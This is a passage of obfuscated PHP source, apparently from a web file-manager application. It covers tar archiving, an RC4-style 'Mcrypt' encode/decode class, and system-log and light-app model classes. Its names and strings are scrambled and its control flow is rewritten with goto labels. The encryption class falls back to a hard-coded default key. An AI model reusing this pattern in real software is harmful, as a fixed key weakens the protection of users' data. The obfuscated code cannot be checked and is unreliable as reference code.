($eÿØª√€Ì≥ == 0) { $c¬ÁÈÇƒ·– = PclTarCreate($D•‘≠é±·â, array($eâ©·±øË“), $d¡æ±Øö™Ü, null, $aï›≥ë™È±); continue; } $c¬ÁÈÇƒ·– = PclTarAddList($D•‘≠é±·â, array($eâ©·±øË“), $dœπ”ä¥úÚ[33], $aï›≥ë™È±, $d¡æ±Øö™Ü); } } } return $c¬ÁÈÇƒ·–; } } class Mcrypt { public static $default_key = "\x61\41\164\x61\153\x41\x3a\144\x6c\x6d\x63\154\144\105\x76\x2c\145"; public static function encode($c™ıΩ…™«±, $e—ÎïëΩ´˜ = '', $F›≥¶É”°÷ = 0) { goto b£«û§ÒûÎ; F„≤‡áﬂŸì: return $aô»ÛÁÿ°â; goto cßµö§∑⁄è; CµáŒãØöÆ: $b»ôÌ•üÈ∫ = $eâÒ¥∏≠»ö . md5($eâÒ¥∏≠»ö . $F‚©‰å“Ï¯); $aêÛ¢äŸîæ = strlen($b»ôÌ•üÈ∫); $c™ıΩ…™«± = sprintf($f¨Üß∏ΩÓì[1297], $F›≥¶É”°÷ ? $F›≥¶É”°÷ + time() : 0) . substr(md5($c™ıΩ…™«± . $f‘ ◊∞â∂…), 0, 16) . $c™ıΩ…™«±; goto A„ôÒ≤”·ç; fåèœ¿™∆“: $a£ò§ãøëﬂ = range(0, 255); for ($Aå€®•è”ö = $F˘ëΩﬁåΩú = 0; $F˘ëΩﬁåΩú < 256; $F˘ëΩﬁåΩú++) { $Aå€®•è”ö = ($Aå€®•è”ö + $a£ò§ãøëﬂ[$F˘ëΩﬁåΩú] + $Fœı—∞äøØ[$F˘ëΩﬁåΩú]) % 256; $Eßãüıﬂä˘ = $a£ò§ãøëﬂ[$F˘ëΩﬁåΩú]; $a£ò§ãøëﬂ[$F˘ëΩﬁåΩú] = $a£ò§ãøëﬂ[$Aå€®•è”ö]; $a£ò§ãøëﬂ[$Aå€®•è”ö] = $Eßãüıﬂä˘; } $aô»ÛÁÿ°â = $f¨Üß∏ΩÓì[33]; goto F£´ñµå·‘; A„ôÒ≤”·ç: $f√Õ∑ÔÕ·√ = strlen($c™ıΩ…™«±); $Fœı—∞äøØ = array(); for ($F˘ëΩﬁåΩú = 0; $F˘ëΩﬁåΩú <= 255; $F˘ëΩﬁåΩú++) { $Fœı—∞äøØ[$F˘ëΩﬁåΩú] = ord($b»ôÌ•üÈ∫[$F˘ëΩﬁåΩú % $aêÛ¢äŸîæ]); } goto fåèœ¿™∆“; e“…í±·‡ó: $eâÒ¥∏≠»ö = md5(substr($e—ÎïëΩ´˜, 0, 16)); $f‘ ◊∞â∂… = md5(substr($e—ÎïëΩ´˜, 16, 16)); $F‚©‰å“Ï¯ = substr(md5(microtime()), -$fëÛëö£óÜ); goto CµáŒãØöÆ; b£«û§ÒûÎ: $f¨Üß∏ΩÓì =& $_SERVER[∞„˜ƒÑºª]; $fëÛëö£óÜ = 4; $e—ÎïëΩ´˜ = md5($e—ÎïëΩ´˜ ? $e—ÎïëΩ´˜ : self::$default_key); goto e“…í±·‡ó; F£´ñµå·‘: for ($dö‰´∏æ´≤ = $Aå€®•è”ö = $F˘ëΩﬁåΩú = 0; $F˘ëΩﬁåΩú < $f√Õ∑ÔÕ·√; $F˘ëΩﬁåΩú++) { $dö‰´∏æ´≤ = ($dö‰´∏æ´≤ + 1) % 256; $Aå€®•è”ö = ($Aå€®•è”ö + $a£ò§ãøëﬂ[$dö‰´∏æ´≤]) % 256; $Eßãüıﬂä˘ = $a£ò§ãøëﬂ[$dö‰´∏æ´≤]; $a£ò§ãøëﬂ[$dö‰´∏æ´≤] = $a£ò§ãøëﬂ[$Aå€®•è”ö]; $a£ò§ãøëﬂ[$Aå€®•è”ö] = $Eßãüıﬂä˘; $aô»ÛÁÿ°â .= chr(ord($c™ıΩ…™«±[$F˘ëΩﬁåΩú]) ^ $a£ò§ãøëﬂ[($a£ò§ãøëﬂ[$dö‰´∏æ´≤] + $a£ò§ãøëﬂ[$Aå€®•è”ö]) % 256]); } $aô»ÛÁÿ°â = $F‚©‰å“Ï¯ . str_replace($f¨Üß∏ΩÓì[667], $f¨Üß∏ΩÓì[33], base64_encode($aô»ÛÁÿ°â)); $aô»ÛÁÿ°â = str_replace(array($f¨Üß∏ΩÓì[283], $f¨Üß∏ΩÓì[8], $f¨Üß∏ΩÓì[667]), array($f¨Üß∏ΩÓì[497], $f¨Üß∏ΩÓì[79], $f¨Üß∏ΩÓì[98]), $aô»ÛÁÿ°â); goto F„≤‡áﬂŸì; cßµö§∑⁄è: } public static function decode($EºÀ≤ïÉì•, $D‡ìÎﬂ¬”È = '') { goto dñÁ°¶»Ÿ‘; f£‡üÇæıΩ: $aﬂ∂ıè¶èï = $A¿óïêÑ∂¯[33]; for ($eºªÁµÉÕñ = $eÒáÿé≠∑ã = $A∞ãŸ”≠ã‡ = 0; $A∞ãŸ”≠ã‡ < $Cè¿«ÍªÉ≠; $A∞ãŸ”≠ã‡++) { $eºªÁµÉÕñ = ($eºªÁµÉÕñ + 1) % 256; $eÒáÿé≠∑ã = ($eÒáÿé≠∑ã + $aÛâÂñÚ«”[$eºªÁµÉÕñ]) % 256; $Eó®à≤µ˜ò = $aÛâÂñÚ«”[$eºªÁµÉÕñ]; $aÛâÂñÚ«”[$eºªÁµÉÕñ] = $aÛâÂñÚ«”[$eÒáÿé≠∑ã]; $aÛâÂñÚ«”[$eÒáÿé≠∑ã] = $Eó®à≤µ˜ò; $aﬂ∂ıè¶èï .= chr(ord($EºÀ≤ïÉì•[$A∞ãŸ”≠ã‡]) ^ $aÛâÂñÚ«”[($aÛâÂñÚ«”[$eºªÁµÉÕñ] + $aÛâÂñÚ«”[$eÒáÿé≠∑ã]) % 256]); } if ((substr($aﬂ∂ıè¶èï, 0, 10) == 0 || substr($aﬂ∂ıè¶èï, 0, 10) - time() > 0) && substr($aﬂ∂ıè¶èï, 10, 16) == substr(md5(substr($aﬂ∂ıè¶èï, 26) . $FÂ≈•¢º¢ñ), 0, 16)) { return substr($aﬂ∂ıè¶èï, 26); } else { return $A¿óïêÑ∂¯[33]; } goto cŒÿï ¡ı≠; Cˆº«íÕå°: $D·—–ÉÎ„È = substr($EºÀ≤ïÉì•, 0, $Dï–§‰Ù†Ì); $dœŒ›‘°◊√ = $EÁÏ±ä◊’ø . md5($EÁÏ±ä◊’ø . $D·—–ÉÎ„È); $AàöÌïã©Ë = strlen($dœŒ›‘°◊√); goto dÕŒ∏€ôÏÛ; cùÜ…§ıëÇ: for ($A∞ãŸ”≠ã‡ = 0; $A∞ãŸ”≠ã‡ <= 255; $A∞ãŸ”≠ã‡++) { $Bó∆”Ì˘£„[$A∞ãŸ”≠ã‡] = ord($dœŒ›‘°◊√[$A∞ãŸ”≠ã‡ % $AàöÌïã©Ë]); } $aÛâÂñÚ«” = range(0, 255); for ($eÒáÿé≠∑ã = $A∞ãŸ”≠ã‡ = 0; $A∞ãŸ”≠ã‡ < 256; $A∞ãŸ”≠ã‡++) { $eÒáÿé≠∑ã = ($eÒáÿé≠∑ã + $aÛâÂñÚ«”[$A∞ãŸ”≠ã‡] + $Bó∆”Ì˘£„[$A∞ãŸ”≠ã‡]) % 256; $Eó®à≤µ˜ò = $aÛâÂñÚ«”[$A∞ãŸ”≠ã‡]; $aÛâÂñÚ«”[$A∞ãŸ”≠ã‡] = $aÛâÂñÚ«”[$eÒáÿé≠∑ã]; $aÛâÂñÚ«”[$eÒáÿé≠∑ã] = $Eó®à≤µ˜ò; } goto f£‡üÇæıΩ; dñÁ°¶»Ÿ‘: $A¿óïêÑ∂¯ =& $_SERVER[∞„˜ƒÑºª]; $EºÀ≤ïÉì• = str_replace(array($A¿óïêÑ∂¯[497], $A¿óïêÑ∂¯[79], $A¿óïêÑ∂¯[98]), array($A¿óïêÑ∂¯[283], $A¿óïêÑ∂¯[8], $A¿óïêÑ∂¯[667]), $EºÀ≤ïÉì•); $Dï–§‰Ù†Ì = 4; goto b˜„Œ–≠ÁÁ; b˜„Œ–≠ÁÁ: $D‡ìÎﬂ¬”È = md5($D‡ìÎﬂ¬”È ? $D‡ìÎﬂ¬”È : self::$default_key); $EÁÏ±ä◊’ø = md5(substr($D‡ìÎﬂ¬”È, 0, 16)); $FÂ≈•¢º¢ñ = md5(substr($D‡ìÎﬂ¬”È, 16, 16)); goto Cˆº«íÕå°; dÕŒ∏€ôÏÛ: $EºÀ≤ïÉì• = base64_decode(substr($EºÀ≤ïÉì•, $Dï–§‰Ù†Ì)); $Cè¿«ÍªÉ≠ = strlen($EºÀ≤ïÉì•); $Bó∆”Ì˘£„ = array(); goto cùÜ…§ıëÇ; cŒÿï ¡ı≠: } } define($_SERVER[∞„˜ƒÑºª][1298], 1); goto DÓ—åÈÚÑ ; AÈüÜä¨èµ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\x4c\151\147\150\x74\x41\x70\160"; public $modelType = "\123\x79\x73\164\x65\x6d\x4f\x70\164\x69\157\156"; public $field = array("\x6e\x61\155\145", "\x67\x72\157\x75\160", "\144\x65\163\x63", "\x63\x6f\156\x74\145\x6e\x74"); public function listData($D–í™•Üæƒ = false, $Fæ’∫äØ©ˆ = "\x6d\157\144\x69\x66\171\x54\151\155\x65", $aáÿ—å¨’⁄ = true) { return parent::listData($D–í™•Üæƒ, $Fæ’∫äØ©ˆ, $aáÿ—å¨’⁄); } public function remove($Cà⁄·ñÕ†ƒ) { $f—…ü˘Ω—ï = $this->findByName($Cà⁄·ñÕ†ƒ); if (!$f—…ü˘Ω—ï) { return !1; } return parent::remove($f—…ü˘Ω—ï[$_SERVER[∞„˜ƒÑºª][366]]); } public function add($bÙ¢“◊∞∆…) { if ($this->findByName($bÙ¢“◊∞∆…[$_SERVER[∞„˜ƒÑºª][28]])) { return !1; } return parent::insert($bÙ¢“◊∞∆…); } public function update($E∫á±òóò¯, $cÇêÔÙ∑π£) { $F‹á¶πµëî =& $_SERVER[∞„˜ƒÑºª]; $c–§ÑœÉâÌ = $this->findByName($E∫á±òóò¯); $eëΩ´ÖËπ = $this->findByName($cÇêÔÙ∑π£[$F‹á¶πµëî[28]]); if (!$c–§ÑœÉâÌ || $eëΩ´ÖËπ && $eëΩ´ÖËπ[$F‹á¶πµëî[366]] != $c–§ÑœÉâÌ[$F‹á¶πµëî[366]]) { return !1; } return parent::update($c–§ÑœÉâÌ[$F‹á¶πµëî[366]], $cÇêÔÙ∑π£); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\x5f\154\157\147"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\x54\x69\x6d\145", "\164\151\155\x65", "\x69\x6e\163\x65\x72\164", "\146\x75\x6e\143\x74\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $Cµö¬ÿ´π‡ =& $_SERVER[∞„˜ƒÑºª]; return array($Cµö¬ÿ´π‡[1757] => LNG($Cµö¬ÿ´π‡[1758]), $Cµö¬ÿ´π‡[1759] => LNG($Cµö¬ÿ´π‡[1760]), $Cµö¬ÿ´π‡[1456] => LNG($Cµö¬ÿ´π‡[1761]), $Cµö¬ÿ´π‡[1762] => LNG($Cµö¬ÿ´π‡[1763]), $Cµö¬ÿ´π‡[1764] => LNG($Cµö¬ÿ´π‡[1765]), $Cµö¬ÿ´π‡[1766] => LNG($Cµö¬ÿ´π‡[1767]), $Cµö¬ÿ´π‡[1768] => LNG($Cµö¬ÿ´π‡[1769]), $Cµö¬ÿ´π‡[1770] => LNG($Cµö¬ÿ´π‡[1771]), $Cµö¬ÿ´π‡[1488] => LNG($Cµö¬ÿ´π‡[1772]), $Cµö¬ÿ´π‡[1773] => LNG($Cµö¬ÿ´π‡[1774]), $Cµö¬ÿ´π‡[1775] => LNG($Cµö¬ÿ´π‡[1776]), $Cµö¬ÿ´π‡[1777] => LNG($Cµö¬ÿ´π‡[1778]), $Cµö¬ÿ´π‡[1779] => LNG($Cµö¬ÿ´π‡[1780]), $Cµö¬ÿ´π‡[1486] => LNG($Cµö¬ÿ´π‡[1781]), $Cµö¬ÿ´π‡[1491] => LNG($Cµö¬ÿ´π‡[1782]), $Cµö¬ÿ´π‡[1783] => LNG($Cµö¬ÿ´π‡[1784]), $Cµö¬ÿ´π‡[1785] => LNG($Cµö¬ÿ´π‡[1786]), $Cµö¬ÿ´π‡[1787] => LNG($Cµö¬ÿ´π‡[1788]), $Cµö¬ÿ´π‡[1789] => LNG($Cµö¬ÿ´π‡[1790]), $Cµö¬ÿ´π‡[1494] => LNG($Cµö¬ÿ´π‡[1791]), $Cµö¬ÿ´π‡[1495] => LNG($Cµö¬ÿ´π‡[1792]), $Cµö¬ÿ´π‡[1793] => LNG($Cµö¬ÿ´π‡[1794]), $Cµö¬ÿ´π‡[1795] => LNG($Cµö¬ÿ´π‡[1796]), $Cµö¬ÿ´π‡[1797] => LNG($Cµö¬ÿ´π‡[1798]), $Cµö¬ÿ´π‡[1799] => LNG($Cµö¬ÿ´π‡[1800]), $Cµö¬ÿ´π‡[1801] => LNG($Cµö¬ÿ´π‡[1802]), $Cµö¬ÿ´π‡[1489] => LNG($Cµö¬ÿ´π‡[1803]), $Cµö¬ÿ´π‡[1804] => LNG($Cµö¬ÿ´π‡[1805]), $Cµö¬ÿ´π‡[1806] => LNG($Cµö¬ÿ´π‡[1807]), $Cµö¬ÿ´π‡[1808] => LNG($Cµö¬ÿ´π‡[1808]), $Cµö¬ÿ´π‡[1809] => LNG($Cµö¬ÿ´π‡[1461]), $Cµö¬ÿ´π‡[1810] => LNG($Cµö¬ÿ´π‡[1811]), $Cµö¬ÿ´π‡[1812] => LNG($Cµö¬ÿ´π‡[1813]), $Cµö¬ÿ´π‡[1814] => LNG($Cµö¬ÿ´π‡[1815]), $Cµö¬ÿ´π‡[1816] => LNG($Cµö¬ÿ´π‡[1817]), $Cµö¬ÿ´π‡[1818] => LNG($Cµö¬ÿ´π‡[1818]), $Cµö¬ÿ´π‡[1819] => LNG($Cµö¬ÿ´π‡[1820]), $Cµö¬ÿ´π‡[1821] => LNG($Cµö¬ÿ´π‡[1822]), $Cµö¬ÿ´π‡[1823] => LNG($Cµö¬ÿ´π‡[1824]), $Cµö¬ÿ´π‡[1825] => LNG($Cµö¬ÿ´π‡[1826]), $Cµö¬ÿ´π‡[1827] => LNG($Cµö¬ÿ´π‡[1828]), $Cµö¬ÿ´π‡[1829] => LNG($Cµö¬ÿ´π‡[1830])); } private function typeFile() { $BﬁÎ∏»Ìµè =& $_SERVER[∞„˜ƒÑºª]; $dÊƒ´∑Ï∫ô = array($BﬁÎ∏»Ìµè[1491] => array($BﬁÎ∏»Ìµè[1492]), $BﬁÎ∏»Ìµè[1777] => array($BﬁÎ∏»Ìµè[1831]), $BﬁÎ∏»Ìµè[1779] => array($BﬁÎ∏»Ìµè[1832]), $BﬁÎ∏»Ìµè[1486] => array($BﬁÎ∏»Ìµè[1487]), $BﬁÎ∏»Ìµè[1785] => array(), $BﬁÎ∏»Ìµè[1787] => array(), $BﬁÎ∏»Ìµè[1789] => array(), $BﬁÎ∏»Ìµè[1494] => array($BﬁÎ∏»Ìµè[1496]), $BﬁÎ∏»Ìµè[1495] => array($BﬁÎ∏»Ìµè[1496]), $BﬁÎ∏»Ìµè[1793] => array($BﬁÎ∏»Ìµè[1833]), $BﬁÎ∏»Ìµè[1795] => array($BﬁÎ∏»Ìµè[1833]), $BﬁÎ∏»Ìµè[1797] => array($BﬁÎ∏»Ìµè[1834]), $BﬁÎ∏»Ìµè[1783] => array($BﬁÎ∏»Ìµè[1835]), $BﬁÎ∏»Ìµè[1799] => array($BﬁÎ∏»Ìµè[1836]), $BﬁÎ∏»Ìµè[1801] => array($BﬁÎ∏»Ìµè[1837]), $BﬁÎ∏»Ìµè[1489] => array($BﬁÎ∏»Ìµè[1490])); return $dÊƒ´∑Ï∫ô; } private function typeAll() { goto cÕ¥¢úÎ–â; BÁ∑ç ¢€»: foreach ($FæôŒÛïä… as $f›Èéòˆ⁄ﬁ => $bùƒ©·º⁄†) { $bØ¢Àº®ÛÎ[$bùƒ©·º⁄†[0]] = $bØ¢Àº®ÛÎ[$f›Èéòˆ⁄ﬁ]; } $bØ¢Àº®ÛÎ[$cãóÎ“îﬁó[1496]] = LNG($cãóÎ“îﬁó[1838]); $bØ¢Àº®ÛÎ[$cãóÎ“îﬁó[1833]] = LNG($cãóÎ“îﬁó[1839]); goto bû‹÷Çßûù; bû‹÷Çßûù: return $bØ¢Àº®ÛÎ; goto e∏ß≤∏ÖÀΩ; cÕ¥¢úÎ–â: $cãóÎ“îﬁó =& $_SERVER[∞„˜ƒÑºª]; $bØ¢Àº®ÛÎ = $this->typeList; $FæôŒÛïä… = array_filter($this->typeFile()); goto BÁ∑ç ¢€»; e∏ß≤∏ÖÀΩ: } public function addLog($C≠õÖ„∆†—, $Bª¨ºê–⁄Ê = array()) { goto Aœî°º∂¿∫; Eÿ˜Í´·ªé: parent::add($Bª¨ºê–⁄Ê); goto dÓõÃã…ä§; D¨«ªâÂœæ: $f◊ûÂ≥ü¡ã = get_client_ip(); if (!$Bª¨ºê–⁄Ê || strlen(json_encode($Bª¨ºê–⁄Ê)) >= 1024) { $Bª¨ºê–⁄Ê = array($A≠√“¡‘ïó[1840] => $f◊ûÂ≥ü¡ã); } else { if (is_array($Bª¨ºê–⁄Ê)) { $Bª¨ºê–⁄Ê[$A≠√“¡‘ïó[1840]] = $f◊ûÂ≥ü¡ã; } else { $Bª¨ºê–⁄Ê = array($A≠√“¡‘ïó[764] => $Bª¨ºê–⁄Ê, $A≠√“¡‘ïó[1840] => $f◊ûÂ≥ü¡ã); } } $Bª¨ºê–⁄Ê = array($A≠√“¡‘ïó[1053] => Session::sign(), $A≠√“¡‘ïó[1054] => $CÑ√˘–ƒ„, $A≠√“¡‘ïó[29] => $C≠õÖ„∆†—, $A≠√“¡‘ïó[1056] => json_encode($Bª¨ºê–⁄Ê)); goto Eÿ˜Í´·ªé; Aœî°º∂¿∫: $A≠√“¡‘ïó =& $_SERVER[∞„˜ƒÑºª]; if (!isset($this->typeList[$C≠õÖ„∆†—])) { return; } $CÑ√˘–ƒ„ = USER_ID ? USER_ID : (isset($Bª¨ºê–⁄Ê[$A≠√“¡‘ïó[1063]]) ? $Bª¨ºê–⁄Ê[$A≠√“¡‘ïó[1063]] : 0); goto D¨«ªâÂœæ; dÓõÃã…ä§: } public function remove($A¶›ËàıÌï) { $this->where(array($_SERVER[∞„˜ƒÑºª][794] => $A¶›ËàıÌï))->delete(); } private function _makeOrder($b¶œƒ·›ıË = '') { goto BﬁöãüäÉ∂; eåô˜›À—Ï: return $this->order($b¶œƒ·›ıË); goto C©äòäôÖ≥; f∏®íôêâÏ: $BÔÎ◊â˘÷¢ = Input::get($BøóäÊèíÜ[1558], $BøóäÊèíÜ[7], $BøóäÊèíÜ[1656], array($BøóäÊèíÜ[1603], $BøóäÊèíÜ[1484])); $BÔÎ◊â˘÷¢ = $F≤ú±∞êƒ†[$BÔÎ◊â˘÷¢]; $b¶œƒ·›ıË = $b¶œƒ·›ıË . "{$fπâ±ù◊òÍ}\40{$BÔÎ◊â˘÷¢}"; goto eåô˜›À—Ï; BﬁöãüäÉ∂: $BøóäÊèíÜ =& $_SERVER[∞„˜ƒÑºª]; $fπâ±ù◊òÍ = $BøóäÊèíÜ[183]; $F≤ú±∞êƒ† = array($BøóäÊèíÜ[1601] => $BøóäÊèíÜ[1602], $BøóäÊèíÜ[1484] => $BøóäÊèíÜ[1560]); goto f∏®íôêâÏ; C©äòäôÖ≥: } public function get($dËÿ⁄êÍıÓ = '') { goto C∏Ê˜”âªï; cµÂÊ‹éïÍ: if ($dËÿ⁄êÍıÓ[$EâÆﬂÈíÉÊ[1063]]) { $Bëã‘èèçó[$EâÆﬂÈíÉÊ[1063]] = $dËÿ⁄êÍıÓ[$EâÆﬂÈíÉÊ[1063]]; } if (isset($dËÿ⁄êÍıÓ[$EâÆﬂÈíÉÊ[458]])) { $AÕ âŸÖÚ∆ = $dËÿ⁄êÍıÓ[$EâÆﬂÈíÉÊ[458]]; $E‚Ã€‰ìÇ‚ = isset($dËÿ⁄êÍıÓ[$EâÆﬂÈíÉÊ[459]]) ? $dËÿ⁄êÍıÓ[$EâÆﬂÈíÉÊ[459]] : time(); $Bëã‘èèçó[$EâÆﬂÈíÉÊ[183]] = array($EâÆﬂÈíÉÊ[320], array($AÕ âŸÖÚ∆, $E‚Ã€‰ìÇ‚)); } if ($dËÿ⁄êÍıÓ[$EâÆﬂÈíÉÊ[29]]) { $CË„äõ‰≈⁄ = explode($EâÆﬂÈíÉÊ[47], $dËÿ⁄êÍıÓ[$EâÆﬂÈíÉÊ[29]]); $dÆ®ﬂ©¬êß = $this->typeFile(); $A¨ï√–∫Õ¯ = array(); foreach ($CË„äõ‰≈⁄ as $eã‡¢ñÑƒ») { $A¨ï√–∫Õ¯[] = $eã‡¢ñÑƒ»; if (isset($dÆ®ﬂ©¬êß[$eã‡¢ñÑƒ»])) { $A¨ï√–∫Õ¯ = array_merge($A¨ï√–∫Õ¯, $dÆ®ﬂ©¬êß[$eã‡¢ñÑƒ»]); } } $A¨ï√–∫Õ¯ = array_unique($A¨ï√–∫Õ¯); if ($A¨ï√–∫Õ¯) { $Bëã‘èèçó[$EâÆﬂÈíÉÊ[29]] = array($EâÆﬂÈíÉÊ[7], $A¨ï√–∫Õ¯); } } goto D¡ÃÁµÕ·; C∏Ê˜”âªï: $EâÆﬂÈíÉÊ =& $_SERVER[∞„˜ƒÑºª]; if (!$dËÿ⁄êÍıÓ) { show_json(array()); } $Bëã‘èèçó = array(); goto cµÂÊ‹éïÍ; D¡ÃÁµÕ·: $AÌ•ﬁÿå‹ì = $this->_makeOrder()->where($Bëã‘èèçó)->selectPage(); if (empty($AÌ•ﬁÿå‹ì[$EâÆﬂÈíÉÊ[354]])) { show_json(array(), !0, $AÌ•ﬁÿå‹ì[$EâÆﬂÈíÉÊ[351]]); } $AÌ•ﬁÿå‹ì[$EâÆﬂÈíÉÊ[354]] = $this->logList($AÌ•ﬁÿå‹ì[$EâÆﬂÈíÉÊ[354]]); goto aòÚΩççÜ·; aòÚΩççÜ·: return $AÌ•ﬁÿå‹ì; goto AÚ¡Àºå€á; AÚ¡Àºå€á: } private function ipAddress(&$B«ö¢˜¬‚Ò) { $A∑‡ëÑÉÿÆ =& $_SERVER[∞„˜ƒÑºª]; if (!empty($B«ö¢˜¬‚Ò[$A∑‡ëÑÉÿÆ[1840]])) { $D∆‚áƒÈÃÃ = IpLocation::get($B«ö¢˜¬‚Ò[$A∑‡ëÑÉÿÆ[1840]]); if ($D∆‚áƒÈÃÃ == $A∑‡ëÑÉÿÆ[1841]) { $D∆‚áƒÈÃÃ = $A∑‡ëÑÉÿÆ[1842]; } } else { $D∆‚áƒÈÃÃ = LNG($A∑‡ëÑÉÿÆ[1843]); } $B«ö¢˜¬‚Ò[$A∑‡ëÑÉÿÆ[1844]] = $D∆‚áƒÈÃÃ; } private function getSourceList(&$DÙ—èúã–Û) { $e∏ÖÆ©‚· =& $_SERVER[∞„˜ƒÑºª]; $b◊©ÜêÚÁÉ = array(); foreach ($DÙ—èúã–Û as $cÒ∞‚‹Î∆é => $cø◊Õ‡—ª◊) { $Cç å¿”õ‡ = json_decode($cø◊Õ‡—ª◊[$e∏ÖÆ©‚·[1560]], !0); if (strpos($cø◊Õ‡—ª◊[$e∏ÖÆ©‚·[29]], $e∏ÖÆ©‚·[1686]) !== 0) { goto eπïÑ¬¥Óï; eπïÑ¬¥Óï: if (!isset($Cç å¿”õ‡[$e∏ÖÆ©‚·[84]]) || strpos($cø◊Õ‡—ª◊[$e∏ÖÆ©‚·[29]], $e∏ÖÆ©‚·[1845]) !== 0) { continue; } if (!IO::init($Cç å¿”õ‡[$e∏ÖÆ©‚·[84]])) { continue; } if (!($cÃﬁÛªû≈ù = IO::infoFull($Cç å¿”õ‡[$e∏ÖÆ©‚·[84]]))) { continue; } goto C≤œÕ„É«á; C≤œÕ„É«á: $b◊©ÜêÚÁÉ[] = $Cç å¿”õ‡[$e∏ÖÆ©‚·[374]] = $cÃﬁÛªû≈ù[$e∏ÖÆ©‚·[374]]; $b◊©ÜêÚÁÉ[] = $Cç å¿”õ‡[$e∏ÖÆ©‚·[1685]] = $cÃﬁÛªû≈ù[$e∏ÖÆ©‚·[384]]; $DÙ—èúã–Û[$cÒ∞‚‹Î∆é][$e∏ÖÆ©‚·[1560]] = json_encode($Cç å¿”õ‡); goto bß±”©É¶≤; bß±”©É¶≤: continue; goto aƒóõ‘√ŸÎ; aƒóõ‘√ŸÎ: } $b◊©ÜêÚÁÉ[] = $Cç å¿”õ‡[$e∏ÖÆ©‚·[374]]; $b◊©ÜêÚÁÉ[] = $Cç å¿”õ‡[$e∏ÖÆ©‚·[1685]]; if ($Cç å¿”õ‡[$e∏ÖÆ©‚·[29]] == $e∏ÖÆ©‚·[734]) { $b◊©ÜêÚÁÉ[] = $Cç å¿”õ‡[$e∏ÖÆ©‚·[1560]][$e∏ÖÆ©‚·[740]]; $b◊©ÜêÚÁÉ[] = $Cç å¿”õ‡[$e∏ÖÆ©‚·[1560]][$e∏ÖÆ©‚·[741]]; } if ($Cç å¿”õ‡[$e∏ÖÆ©‚·[29]] == $e∏ÖÆ©‚·[1689]) { $b◊©ÜêÚÁÉ[] = $Cç å¿”õ‡[$e∏ÖÆ©‚·[1560]][$e∏ÖÆ©‚·[374]]; } } if (!$b◊©ÜêÚÁÉ) { return array(); } return Model($e∏ÖÆ©‚·[520])->sourceListInfo($b◊©ÜêÚÁÉ, !0); } private function logList($c›¡ßÕ‚¿Ω) { goto bÕÉΩüÉ«”; C µÉ´™ﬁ–: foreach ($c›¡ßÕ‚¿Ω as $F™ù˘¡»Æÿ => $F¿è¿ãìÉ–) { goto BÉ„˘ùíÊ´; c¬º’´ˆ‡Ô: if (strpos($c®ü‘Œ√ÑÛ, $a«¢ç◊œ“„[1686]) === 0 || isset($D≤É≠çŸáê[$a«¢ç◊œ“„[1685]])) { goto DÁ°∞‚‚Ô´; E∑≈ÒÛçÔ„: if ($D≤É≠çŸáê[$a«¢ç◊œ“„[29]] == $a«¢ç◊œ“„[1689]) { $D≤É≠çŸáê[$a«¢ç◊œ“„[1560]][$a«¢ç◊œ“„[374]] = $bˆ≈Á∞Âÿ™[$D≤É≠çŸáê[$a«¢ç◊œ“„[1560]][$a«¢ç◊œ“„[374]]]; } if ($D≤É≠çŸáê[$a«¢ç◊œ“„[29]] == $a«¢ç◊œ“„[368]) { $D≤É≠çŸáê[$a«¢ç◊œ“„[1696]] = $D≤É≠çŸáê[$a«¢ç◊œ“„[1618]]; $D≤É≠çŸáê[$a«¢ç◊œ“„[1685]] = $D≤É≠çŸáê[$a«¢ç◊œ“„[1696]][$a«¢ç◊œ“„[374]]; $D≤É≠çŸáê[$a«¢ç◊œ“„[1618]] = !1; $D≤É≠çŸáê[$a«¢ç◊œ“„[374]] = $a«¢ç◊œ“„[33]; } if ($D≤É≠çŸáê[$a«¢ç◊œ“„[1618]] && $D≤É≠çŸáê[$a«¢ç◊œ“„[1618]][$a«¢ç◊œ“„[393]] == $a«¢ç◊œ“„[804]) { unset($c›¡ßÕ‚¿Ω[$F™ù˘¡»Æÿ]); continue; } goto d∑Ô¡·ØÜƒ; d∑Ô¡·ØÜƒ: if ($D≤É≠çŸáê[$a«¢ç◊œ“„[1696]] && $D≤É≠çŸáê[$a«¢ç◊œ“„[1696]][$a«¢ç◊œ“„[393]] == $a«¢ç◊œ“„[804]) { unset($c›¡ßÕ‚¿Ω[$F™ù˘¡»Æÿ]); continue; } goto FòõïÆÃú∏; DÁ°∞‚‚Ô´: $D≤É≠çŸáê[$a«¢ç◊œ“„[1618]] = $bˆ≈Á∞Âÿ™[$D≤É≠çŸáê[$a«¢ç◊œ“„[374]]]; $D≤É≠çŸáê[$a«¢ç◊œ“„[1696]] = $bˆ≈Á∞Âÿ™[$D≤É≠çŸáê[$a«¢ç◊œ“„[1685]]]; if ($D≤É≠çŸáê[$a«¢ç◊œ“„[29]] == $a«¢ç◊œ“„[734]) { $D≤É≠çŸáê[$a«¢ç◊œ“„[1560]][$a«¢ç◊œ“„[740]] = $bˆ≈Á∞Âÿ™[$D≤É≠çŸáê[$a«¢ç◊œ“„[1560]][$a«¢ç◊œ“„[740]]]; $D≤É≠çŸáê[$a«¢ç◊œ“„[1560]][$a«¢ç◊œ“„[741]] = $bˆ≈Á∞Âÿ™[$D≤É≠çŸáê[$a«¢ç◊œ“„[1560]][$a«¢ç◊œ“„[741]]]; } goto E∑≈ÒÛçÔ„; FòõïÆÃú∏: } $F¿è¿ãìÉ–[$a«¢ç◊œ“„[1560]] = $D≤É≠çŸáê; $dÒïÖƒ—π¬[] = $F¿è¿ãìÉ–; goto Eº§”¥Ö¿Ú; D∫ΩüêêÔ‚: $F¿è¿ãìÉ–[$a«¢ç◊œ“„[1846]] = isset($b¯ÃΩ√‘•’[$E¿Ö˘Ñ“»î][$a«¢ç◊œ“„[1846]]) ? $b¯ÃΩ√‘•’[$E¿Ö˘Ñ“»î][$a«¢ç◊œ“„[1846]] : $a«¢ç◊œ“„[33]; $F¿è¿ãìÉ–[$a«¢ç◊œ“„[973]] = isset($a‹«çÓ´òÚ[$c®ü‘Œ√ÑÛ]) ? $a‹«çÓ´òÚ[$c®ü‘Œ√ÑÛ] : (strpos($c®ü‘Œ√ÑÛ, $a«¢ç◊œ“„[1847]) == 0 ? LNG($a«¢ç◊œ“„[1848]) : LNG($a«¢ç◊œ“„[1843])); 